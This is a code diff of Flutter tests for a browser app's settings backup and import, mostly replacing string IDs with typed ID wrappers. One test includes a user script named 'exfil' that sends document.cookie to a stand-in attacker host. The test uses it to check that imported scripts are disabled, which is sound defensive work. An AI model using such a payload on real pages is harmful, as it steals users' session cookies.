@@ -2,6 +2,7 @@ import 'dart:convert';
 
 import 'package:flutter_test/flutter_test.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:webspace/settings/filter_list_id.dart';
 import 'package:webspace/services/content_blocker_service.dart';
 import 'package:webspace/services/settings_import_engine.dart'
     show sanitizeImportedSites;
@@ -68,7 +69,7 @@ void main() {
         ],
         themeMode: 2,
         showUrlBar: true,
-        selectedWebspaceId: 'ws-1',
+        selectedWebspaceId: WebspaceId('ws-1'),
         currentIndex: 0,
         exportedAt: DateTime(2024, 1, 15, 10, 30),
       );
@@ -165,7 +166,7 @@ void main() {
         ],
         themeMode: 2,
         showUrlBar: true,
-        selectedWebspaceId: 'w1',
+        selectedWebspaceId: WebspaceId('w1'),
         currentIndex: 1,
         exportedAt: DateTime.now(),
       );
@@ -191,7 +192,7 @@ void main() {
       ];
       final webspaces = [
         Webspace.all(),
-        Webspace(id: 'work', name: 'Work', siteIndices: [0]),
+        Webspace(id: WebspaceId('work'), name: 'Work', siteIndices: [0]),
       ];
 
       final backup = SettingsBackupService.createBackup(
@@ -199,7 +200,7 @@ void main() {
         webspaces: webspaces,
         themeMode: 1,
         showUrlBar: true,
-        selectedWebspaceId: 'work',
+        selectedWebspaceId: WebspaceId('work'),
         currentIndex: 0,
       );
 
@@ -256,7 +257,7 @@ void main() {
 
       // Only custom webspaces should be exported
       expect(backup.webspaces, hasLength(2));
-      expect(backup.webspaces.every((ws) => ws['id'] != kAllWebspaceId), isTrue);
+      expect(backup.webspaces.every((ws) => ws['id'] != WebspaceId.all), isTrue);
     });
 
     test('should preserve site settings with non-secure cookies only', () {
@@ -446,7 +447,7 @@ void main() {
       final webspaces = SettingsBackupService.restoreWebspaces(backup);
 
       expect(webspaces, hasLength(3)); // "All" + 2 custom
-      expect(webspaces[0].id, equals(kAllWebspaceId));
+      expect(webspaces[0].id, equals(WebspaceId.all));
       expect(webspaces[0].name, equals('All'));
       expect(webspaces[1].name, equals('Work'));
       expect(webspaces[2].name, equals('Personal'));
@@ -454,7 +455,7 @@ void main() {
 
     test('should skip "All" webspace if somehow in backup', () {
       final backup = _backupOf(webspaces: [
-        {'id': kAllWebspaceId, 'name': 'All', 'siteIndices': []},
+        {'id': WebspaceId.all, 'name': 'All', 'siteIndices': []},
         {'id': 'ws-1', 'name': 'Custom', 'siteIndices': [0]},
       ]);
 
@@ -462,7 +463,7 @@ void main() {
 
       // Should have exactly one "All" (auto-created) + one custom
       expect(webspaces, hasLength(2));
-      expect(webspaces.where((ws) => ws.id == kAllWebspaceId).length, equals(1));
+      expect(webspaces.where((ws) => ws.id == WebspaceId.all).length, equals(1));
     });
 
     test('should handle empty webspaces list', () {
@@ -472,7 +473,7 @@ void main() {
 
       // Should still have "All" webspace
       expect(webspaces, hasLength(1));
-      expect(webspaces[0].id, equals(kAllWebspaceId));
+      expect(webspaces[0].id, equals(WebspaceId.all));
     });
 
     test('should preserve webspace site indices', () {
@@ -506,7 +507,7 @@ void main() {
         // positional siteIndices is the runtime view rebuilt by
         // `_resolveWebspaceIndices` after models load and is not
         // included in the backup payload.
-        Webspace(id: 'work', name: 'Work', siteIds: [originalSites[0].siteId]),
+        Webspace(id: WebspaceId('work'), name: 'Work', siteIds: [originalSites[0].siteId]),
       ];
 
       // Export
@@ -515,7 +516,7 @@ void main() {
         webspaces: originalWebspaces,
         themeMode: 2,
         showUrlBar: true,
-        selectedWebspaceId: 'work',
+        selectedWebspaceId: WebspaceId('work'),
         currentIndex: 0,
       );
       final jsonString = SettingsBackupService.exportToJson(backup);
@@ -541,7 +542,7 @@ void main() {
 
       // Verify webspaces
       expect(restoredWebspaces, hasLength(2));
-      expect(restoredWebspaces[0].id, equals(kAllWebspaceId));
+      expect(restoredWebspaces[0].id, equals(WebspaceId.all));
       expect(restoredWebspaces[1].id, equals('work'));
       expect(restoredWebspaces[1].name, equals('Work'));
       expect(restoredWebspaces[1].siteIds, equals([originalSites[0].siteId]));
@@ -806,12 +807,12 @@ void main() {
         initUrl: 'https://a.com',
         userScripts: [
           UserScriptConfig(
-            id: 's1',
+            id: UserScriptId('s1'),
             name: 'exfil',
             source: 'fetch("https://attacker.example/" + document.cookie)',
           ),
         ],
-        enabledGlobalScriptIds: {'g1'},
+        enabledGlobalScriptIds: {UserScriptId('g1')},
       ).toJson();
       final restored = importSanitized(siteJson);
       expect(restored.single.userScripts.single.enabled, isFalse);
@@ -927,7 +928,7 @@ void main() {
       addTearDown(service.reset);
       service.setLists([
         FilterList(
-          id: 'easylist',
+          id: FilterListId('easylist'),
           name: 'EasyList',
           url: 'https://easylist.to/easylist/easylist.txt',
           enabled: true,
